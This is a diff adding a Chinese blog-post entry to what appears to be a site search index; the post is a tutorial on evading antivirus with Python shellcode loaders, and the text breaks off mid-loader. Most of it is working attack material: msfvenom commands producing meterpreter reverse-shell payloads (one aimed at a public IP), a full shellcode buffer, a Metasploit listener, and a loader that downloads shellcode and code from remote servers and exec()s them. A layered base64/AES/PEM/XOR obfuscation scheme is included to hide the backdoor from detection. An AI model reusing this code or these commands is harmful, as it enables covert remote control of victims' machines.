@@ -1,6 +1,246 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>python分离免杀</title>
+    <url>/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/</url>
+    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><table>
+<thead>
+<tr>
+<th>对象</th>
+<th>操作系统</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>kali</td>
+<td>192.168.125.29</td>
+</tr>
+<tr>
+<td>被攻击机</td>
+<td>windows10</td>
+<td>192.168.125.151</td>
+</tr>
+<tr>
+<td>服务器一</td>
+<td>centos</td>
+<td>192.168.125.10</td>
+</tr>
+<tr>
+<td>服务器二</td>
+<td>centos</td>
+<td>192.168.125.20</td>
+</tr>
+</tbody></table>
+<p>使用msfvenom生成基于python的shellcode，-b参数是为了避免坏字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.125.29 lport=8888 -f py -b=&quot;\x00&quot;</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=58.87.68.13 lport=9999 -f py -b=&quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最终生成的反向连接shellcode如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d&quot;</span><br><span class="line">buf += b&quot;\x05\xef\xff\xff\xff\x48\xbb\x6c\x71\x11\x47\x30&quot;</span><br><span class="line">buf += b&quot;\x93\x87\xeb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff&quot;</span><br><span class="line">buf += b&quot;\xff\xe2\xf4\x90\x39\x92\xa3\xc0\x7b\x4b\xeb\x6c&quot;</span><br><span class="line">buf += b&quot;\x71\x50\x16\x71\xc3\xd5\xa3\x5d\xa3\x40\x11\x55&quot;</span><br><span class="line">buf += b&quot;\xdb\x0c\xb9\x0c\x39\x9a\x15\x28\xdb\x0c\xb9\x4c&quot;</span><br><span class="line">buf += b&quot;\x39\x9a\x35\x60\xde\xb6\x22\x24\x7e\xa6\x0d\x7a&quot;</span><br><span class="line">buf += b&quot;\xdb\xb6\x2b\xc0\x4d\x70\x3b\x32\xbf\xa7\xaa\xad&quot;</span><br><span class="line">buf += b&quot;\xb8\x1c\x06\x31\x52\x65\x06\x3e\x39\x9a\x15\x10&quot;</span><br><span class="line">buf += b&quot;\xd2\xd6\x60\x2e\x4d\x59\x46\xe0\xf5\x06\x93\x74&quot;</span><br><span class="line">buf += b&quot;\x7a\x13\x48\xb5\xe1\x87\xeb\x6c\xfa\x91\xcf\x30&quot;</span><br><span class="line">buf += b&quot;\x93\x87\xa3\xe9\xb1\x65\x20\x78\x92\x57\xbb\xe7&quot;</span><br><span class="line">buf += b&quot;\x39\x09\x03\xbb\xd3\xa7\xa2\x6d\xa1\xf2\x11\x78&quot;</span><br><span class="line">buf += b&quot;\x6c\x4e\xa6\x5d\xb8\x50\xcc\x04\x1b\xcf\xea\xba&quot;</span><br><span class="line">buf += b&quot;\x39\x20\x87\x9c\xd2\x46\x22\x61\x30\x10\x86\x08&quot;</span><br><span class="line">buf += b&quot;\x73\xf2\x1a\x20\x72\x5d\x63\x38\xd6\xbe\x3a\x19&quot;</span><br><span class="line">buf += b&quot;\xa9\x49\x03\xbb\xd3\xa3\xa2\x6d\xa1\x77\x06\xbb&quot;</span><br><span class="line">buf += b&quot;\x9f\xcf\xaf\xe7\x31\x0d\x0e\x31\x43\xc6\x60\x68&quot;</span><br><span class="line">buf += b&quot;\xf9\x59\x46\xe0\xd2\xdf\xaa\x34\x2f\x48\x1d\x71&quot;</span><br><span class="line">buf += b&quot;\xcb\xc6\xb2\x2d\x2b\x59\xc4\xdc\xb3\xc6\xb9\x93&quot;</span><br><span class="line">buf += b&quot;\x91\x49\x06\x69\xc9\xcf\x60\x7e\x98\x5a\xb8\xcf&quot;</span><br><span class="line">buf += b&quot;\x6c\xda\xa2\xd2\x06\x62\x75\x6f\xa0\xb5\xeb\x6c&quot;</span><br><span class="line">buf += b&quot;\x30\x47\x0e\xb9\x75\xcf\x6a\x80\xd1\x10\x47\x30&quot;</span><br><span class="line">buf += b&quot;\xda\x0e\x0e\x25\xcd\x13\x47\x12\x2b\x47\x43\x11&quot;</span><br><span class="line">buf += b&quot;\x6c\x50\x13\x79\x1a\x63\xa7\xe5\x80\x50\xfd\x7c&quot;</span><br><span class="line">buf += b&quot;\xe4\xa1\xec\x93\xa4\x5d\xce\xda\xfb\x86\xea\x6c&quot;</span><br><span class="line">buf += b&quot;\x71\x48\x06\x8a\xba\x07\x80\x6c\x8e\xc4\x2d\x3a&quot;</span><br><span class="line">buf += b&quot;\xd2\xd9\xbb\x3c\x3c\x20\x8e\x7d\xa2\x47\xa3\x93&quot;</span><br><span class="line">buf += b&quot;\xb1\x59\xce\xf2\xdb\x78\x2b\x24\xf8\xd0\x06\x8a&quot;</span><br><span class="line">buf += b&quot;\x79\x88\x34\x8c\x8e\xc4\x0f\xb9\x54\xed\xfb\x2d&quot;</span><br><span class="line">buf += b&quot;\x29\x5d\xce\xd2\xdb\x0e\x12\x2d\xcb\x88\xe2\x44&quot;</span><br><span class="line">buf += b&quot;\xf2\x78\x3e\xe9\xb1\x65\x4d\x79\x6c\x49\x9e\x89&quot;</span><br><span class="line">buf += b&quot;\x99\x82\x47\x30\x93\xcf\x68\x80\x61\x59\xce\xd2&quot;</span><br><span class="line">buf += b&quot;\xde\xb6\x22\x06\x75\x50\x1f\x78\x1a\x7e\xaa\xd6&quot;</span><br><span class="line">buf += b&quot;\x73\xc8\x8f\x6f\x6c\x52\x68\x94\x71\x6f\x12\x78&quot;</span><br><span class="line">buf += b&quot;\x10\x43\xcb\x32\xf8\xe7\x2d\x70\xd2\xde\x83\x6c&quot;</span><br><span class="line">buf += b&quot;\x61\x11\x47\x71\xcb\xcf\x62\x9e\x39\x20\x8e\x71&quot;</span><br><span class="line">buf += b&quot;\x29\xdf\x4f\x3f\x94\xee\x92\x78\x1a\x44\xa2\xe5&quot;</span><br><span class="line">buf += b&quot;\xb6\x5c\x76\xf9\xda\x0e\x1b\x24\xf8\xcb\x0f\xb9&quot;</span><br><span class="line">buf += b&quot;\x6a\xc6\x51\x6e\xa8\xd9\x18\xcf\x46\x04\x13\x6c&quot;</span><br><span class="line">buf += b&quot;\x0c\x39\x1f\x71\xc4\xde\x83\x6c\x31\x11\x47\x71&quot;</span><br><span class="line">buf += b&quot;\xcb\xed\xeb\x36\x30\xab\x4c\x1f\x9c\xb7\x14\xb9&quot;</span><br><span class="line">buf += b&quot;\x26\x48\x06\x8a\xe6\xe9\xa6\x0d\x8e\xc4\x0e\xcf&quot;</span><br><span class="line">buf += b&quot;\x5d\x6e\xd7\x93\x8e\xee\x0f\x31\x50\xcf\xc2\xaa&quot;</span><br><span class="line">buf += b&quot;\x39\x94\xb1\x45\x27\xc6\x14\x8b\x29\x7b\x47\x69&quot;</span><br><span class="line">buf += b&quot;\xda\x40\x29\x9c\xc4\xb3\x11\xcf\x46\x87\xeb&quot;</span><br></pre></td></tr></table></figure>
+
+<p>kali（192.168.125.29）开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler/</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image-20240613161650234-17390843917341.png" alt="image-20240613161650234"></p>
+<h2 id="技术支持"><a href="#技术支持" class="headerlink" title="技术支持"></a>技术支持</h2><h3 id="分离技术"><a href="#分离技术" class="headerlink" title="分离技术"></a>分离技术</h3><p>将ShellCode和加载器代码放置于网络&#x2F;服务器上，可以是二进制文件、文本文件、jpg等文件，通过请求读取的方式进行加载</p>
+<p>实际测试用例中，主要思想是将经加密、编码后的shellcode放入服务器一中，将加密、编码后的shellcodeloader放入服务器二中，使用python中的request方法请求服务器的url，获取相应的shellcode和shellcodeloader，最终使用exec函数执行加载器</p>
+<p>在如下代码中，a.text表示shellcode，b.content表示shellcodeloader，shellcodeloader中包含了解密所需方法、所需库，buf（shellcode）最终被带入b.content中进行解密、执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = requests.get(&#x27;http://192.168.125.10/a.txt&#x27;)</span><br><span class="line">buf = a.text</span><br><span class="line"></span><br><span class="line">b = requests.get(&#x27;http://192.168.125.20/b.txt&#x27;)</span><br><span class="line">exec(base64.b64decode(b.content)[::-1].decode())</span><br></pre></td></tr></table></figure>
+
+<h3 id="异或加密"><a href="#异或加密" class="headerlink" title="异或加密"></a>异或加密</h3><p>异或运算是最为简单的加密方式，异或运算根据二进制位进行按位运算，如果对应位相同，则为0，不同则为1</p>
+<p>也可以如以下代码，把每个字符转成ASCII值与特定的值（678）进行异或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def shellcode_xor(shellcode):</span><br><span class="line">    xor_code = &#x27;&#x27;</span><br><span class="line">    for i in shellcode:</span><br><span class="line">        i = ord(i) ^ 678</span><br><span class="line">        xor_code += str(i) + &#x27;_&#x27;</span><br><span class="line">    # 去掉最后一个_</span><br><span class="line">    return xor_code[:-1]</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h3><p>在Python中，对一个字符串进行反转，使用str[::-1]即可</p>
+<p>主要原理是使用了python切片的原理，可以使用该方法对代码中出现的shellcode或者shellcodeloader进行反转，进一步消除特征</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str=&quot;abc&quot;</span><br><span class="line">print(str[::-1])		//会输出cba</span><br><span class="line"></span><br><span class="line"># shellcodeloader反转</span><br><span class="line">shell_loader = b&#x27;&#x27;&#x27;</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellloader = shell_loader[::-1]</span><br></pre></td></tr></table></figure>
+
+<h3 id="字节转字符串"><a href="#字节转字符串" class="headerlink" title="字节转字符串"></a>字节转字符串</h3><p>由于Python的ShellCode为b’’的字节类型（也可以视为二进制类型），而要进行加密或反转处理，只能针对字符串进行处理，所以还需要对将字节类型数据转换为字符串。可以利用Python内置的binascii模块进行处理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">buf = b&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span><br><span class="line">str = binascii.b2a_hex(buf).decode()</span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>
+
+<h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><p>AES属于对称加密算法，分组加密，算法明文长度<strong>固定为128位</strong>（单位是比特bit，1bit就是1位，128位等于16字节）</p>
+<p>而密钥长度可以是128、192、256位</p>
+<p>测试免杀技术使用AES的CBC模式，使得对同一明文两次加密结果是不同的</p>
+<ul>
+<li>使用前一个密文块对当前明文块进行加密，增加了随机性，相同的明文块在不同位置得到不同密文块。</li>
+<li>需要使用初始化向量（IV）来增加安全性。</li>
+</ul>
+<p>原理就是首先将明文进行分组，128位为一组，然后使用密钥结合AES算法对分组后的明文进行加密</p>
+<p>CBC模式图：</p>
+<p><img src="/image-20240613170450982-17390843917342.png" alt="image-20240613170450982"></p>
+<p>python为AES代码实现提供了一种很方便的库，我们可以引用相关库实现AES加密</p>
+<p>考虑到明文有时候不够128位，所以使用pad来进行填充，unpad就是去除填充</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line"></span><br><span class="line">def aes_encode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    # 填充明文，加密的数据必须被128整除</span><br><span class="line">    b = a.encrypt(pad(shellcode, 32))</span><br><span class="line">    # byte转16</span><br><span class="line">    return binascii.b2a_hex(b)</span><br></pre></td></tr></table></figure>
+
+<h3 id="PEM加密"><a href="#PEM加密" class="headerlink" title="PEM加密"></a>PEM加密</h3><p>PEM是一种编码格式，用于表示各种类型的加密数据。它最初是为了电子邮件安全而设计的，现在广泛用于存储和传输加密密钥、证书、和其他数据</p>
+<p>python中提供了Crypto库，来方便实现PEM加密，我们可以对shellcode进行PEM加密，以此来确保shellcode特征进一步钝化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line">def PEM_encode(shellcode):</span><br><span class="line">    # PEM.encode(需要加密的数据, 指定名称, 指定密钥)</span><br><span class="line">    shellcode = PEM.encode(shellcode, &#x27;&#x27;, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br></pre></td></tr></table></figure>
+
+<p>测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line">def PEM_encode(shellcode):</span><br><span class="line">    shellcode = PEM.encode(shellcode, &#x27;&#x27;, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def b_to_a(shellcode):</span><br><span class="line">    return binascii.b2a_hex(shellcode)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    shellcode = b&quot;\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d&quot;</span><br><span class="line">    print(PEM_encode(b_to_a(shellcode)))</span><br></pre></td></tr></table></figure>
+
+<p>输出，它使用DES-EDE3-CBC加密。这通常包括以下部分：</p>
+<ul>
+<li><strong>Proc-Type</strong>: 指示数据处理类型，这里表示数据是被加密状态</li>
+<li><strong>DEK-Info</strong>: 包含加密算法和初始化向量（IV），这里是三重DES算法，采用CBC模式</li>
+<li>最后一行表示经base64编码的加密数据，解密该数据需要使用前述的加密算法和初始化向量，并提供正确的密钥</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN -----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,743C4F516B99C6F0</span><br><span class="line"></span><br><span class="line">nQMNd5pisCY8lLAIihA3VJR4hQp2cJ9GSbSKhcaF++Y=</span><br><span class="line">-----END -----</span><br></pre></td></tr></table></figure>
+
+<p>PEM解码后中，PEM_decode一般会返回一个元组，包含多个元素，如下所示：</p>
+<ol>
+<li>解码后的二进制数据</li>
+<li>可能的其他信息（例如解码过程中提取的参数）</li>
+</ol>
+<p>所以我们需要<strong>取解码后元组的第一个参数</strong>，即为解码后的原始数据</p>
+<h3 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h3><p>在网络安全领域，Shellcode加载器通常被黑客用于将Shellcode加载到目标计算机的内存中并执行它。这些加载器被安全专业人员、研究人员和安全分析师用于分析恶意软件样本中的Shellcode部分，以便了解恶意软件的行为、目的和潜在威胁。Python的灵活性和强大的库，使得Python逐渐被用于Shellcode的加载和免杀技术。</p>
+<p>我们可以利用Python中的ctypes库实现shellcode的加载，ctypes是Python的外部函数库。它提供了与C语言兼容的数据类型，并允许调用DLL或共享库中的函数。可使用该模块以纯 Python形式对这些库进行封装。</p>
+<p>Shellcode加载器一般分为3步：</p>
+<p>申请内存-&gt;Shellcode写入内存(-&gt; 修改内存属性)-&gt;执行该内存。</p>
+<p>下面这段代码就是一个经典的Shellcode加载器，主要使用了以下的api:</p>
+<p>① VirtualAlloc动态申请内存</p>
+<p>② RtlMoveMemory将Shellcode拷贝入申请空间</p>
+<p>③ CreateThread创建线程运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line"># shellcode</span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line"></span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))</span><br><span class="line"># 创建一个线程从shellcode放置位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0),</span><br><span class="line">                                             ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>代码执行完成后，Shellcode加载器就会将buf中的二进制代码放入内存中执行，由于Shellcode本身较为复杂，很难由人来直接编写，所以我们可以借助工具例如cobaltstrike或者msfvenom来得到</p>
+<p>下面是一个生成反向后门的msfvenom命令，其中-p指定使用哪个模块，lhost和lport设置反向连接的主机和端口，-f指定shellcode生成的格式，可以是raw（二进制文件）、jpg、py等，-b参数避免生成一些坏字符（\x00表示空格，也就是程序结束）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.125.29 lport=8888 -f py -b=&quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用CS生成payload后门</p>
+<p>kali开启CS服务端</p>
+<p><img src="/image-20240614093033227-17390843917354.png" alt="image-20240614093033227"></p>
+<p>主机打开CS客户端连接服务端</p>
+<p><img src="/image-20240614093120525-17390843917353.png" alt="image-20240614093120525"></p>
+<p>在攻击–&gt;生成后门–&gt;payload生成器中</p>
+<p><img src="/image-20240614093141355-17390843917355.png" alt="image-20240614093141355"></p>
+<p><img src="/image-20240614093302735-17390843917356.png" alt="image-20240614093302735"></p>
+<h2 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h2><h3 id="不应用任何免杀技术"><a href="#不应用任何免杀技术" class="headerlink" title="不应用任何免杀技术"></a>不应用任何免杀技术</h3><p>使用shellcode加载器分配内存执行shellcode，可以正常上线</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line"># shellcode</span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line"></span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))</span><br><span class="line"># 创建一个线程从shellcode放置位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0),</span><br><span class="line">                                             ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image-20240613161730129-17390843917358.png" alt="image-20240613161730129"></p>
+<p>无论是py文件还是打包成exe，就会马上被安全软件检测出来，根据提示被发现是后门木马</p>
+<p><img src="/image-20240613162146020-17390843917357.png" alt="image-20240613162146020"></p>
+<h3 id="shellcode加密混淆"><a href="#shellcode加密混淆" class="headerlink" title="shellcode加密混淆"></a>shellcode加密混淆</h3><p>结合上述提示，说明杀毒软件检测出来了shellcode，爆出了后门木马</p>
+<p>那么可以将shellcode进行加密编码混淆，使得检出率降低</p>
+<p>将shellcode进行byte转str–&gt;base64编码–&gt;AES加密，后依旧爆出后门木马</p>
+<p>改进shellcode加密方式，byte转str–&gt;base64编码–&gt;AES加密–&gt;PEM加密–&gt;异或</p>
+<p>编写shellcode加密算法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># msf生成的shellcode</span><br><span class="line">buf = b&quot;&quot;</span><br><span class="line"></span><br><span class="line"># shellcode加载器</span><br><span class="line">shell_loader = b&#x27;&#x27;&#x27;</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># AES加密密钥（128位/192位/256位---&gt;16byte/24byte/32byte）</span><br><span class="line">key = b&#x27;4d65017f65d72aada5d1ab08d5c4bd18&#x27;</span><br><span class="line"># AES初始化向量（IV）</span><br><span class="line">iv = b&#x27;7d2d3e0bb1642d52&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">AES加密算法(CBC)</span><br><span class="line">采用CBC模式，相同的明文块在不同位置得到不同密文块</span><br><span class="line">将明文以128位分成组，然后利用使用初始化向量（IV）、加密算法和密钥进行加密</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def aes_encode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    # 填充明文</span><br><span class="line">    b = a.encrypt(pad(shellcode, 32))</span><br><span class="line">    # byte转16</span><br><span class="line">    return binascii.b2a_hex(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">byte转16</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def b_to_a(shellcode):</span><br><span class="line">    return binascii.b2a_hex(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">base64编码</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def b64_encode(shellcode):</span><br><span class="line">    return base64.b64encode(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">PEM加密</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def PEM_encode(shellcode):</span><br><span class="line">    # PEM.encode(需要加密的数据, 指定名称, 指定密钥)</span><br><span class="line">    shellcode = PEM.encode(shellcode, &#x27;&#x27;, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">异或</span><br><span class="line">把每个字符转成ASCII值与678进行异或</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def shellcode_xor(shellcode):</span><br><span class="line">    xor_code = &#x27;&#x27;</span><br><span class="line">    for i in shellcode:</span><br><span class="line">        i = ord(i) ^ 678</span><br><span class="line">        xor_code += str(i) + &#x27;_&#x27;</span><br><span class="line">    # 去掉最后一个_</span><br><span class="line">    return xor_code[:-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shellcode加密算法</span><br><span class="line">先把shellcode转为str，然后进行base64编码+AES+PEM+xor</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def shellcode_encode(shellcode):</span><br><span class="line">    return shellcode_xor(PEM_encode(aes_encode(b64_encode(b_to_a(shellcode)))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">调用shellcode加密算法，对shellcode进行加密</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def main(shellcode):</span><br><span class="line">    return shellcode_encode(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    shellcode = main(buf)</span><br><span class="line">    print(&quot;shellcode为:&quot;)</span><br><span class="line">    print(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>上述shellcode加密脚本会生成一个加密后的shellcode，将shellcode加密后的值放入shellcodeloader中加载器即可</p>
+<p>编写shellcodeloader，其中包含解密方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = b&#x27;4d65017f65d72aada5d1ab08d5c4bd18&#x27;</span><br><span class="line">iv = b&#x27;7d2d3e0bb1642d52&#x27;</span><br><span class="line"></span><br><span class="line">def aes_decode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    shellcode = binascii.a2b_hex(shellcode)</span><br><span class="line">    shellcode = unpad(a.decrypt(shellcode), 32)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def a_to_b(shellcode):</span><br><span class="line">    return binascii.a2b_hex(shellcode)</span><br><span class="line"></span><br><span class="line">def b64decode(shellcode):</span><br><span class="line">    return base64.b64decode(shellcode)</span><br><span class="line"></span><br><span class="line">def PEM_decode(shellcode):</span><br><span class="line">    shellcode = PEM.decode(shellcode, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def shellcode_xor_decode(shellcode):</span><br><span class="line">    shellcode = shellcode.split(&#x27;_&#x27;)</span><br><span class="line">    xor_code = &#x27;&#x27;</span><br><span class="line">    for i in shellcode:</span><br><span class="line">        i = int(i) ^ 678</span><br><span class="line">        xor_code += chr(i)</span><br><span class="line">    return xor_code</span><br><span class="line"></span><br><span class="line">def main(shellcode):</span><br><span class="line">    return a_to_b(b64decode(aes_decode(PEM_decode(shellcode_xor_decode(shellcode))[0])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 存放加密后的shellcode</span><br><span class="line">buf = &#x27;&#x27;</span><br><span class="line">buf = main(buf)</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))</span><br><span class="line"># 创建一个线程从shellcode放置位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr),</span><br><span class="line">                                             ctypes.c_int(0),</span><br><span class="line">                                             ctypes.c_int(0), 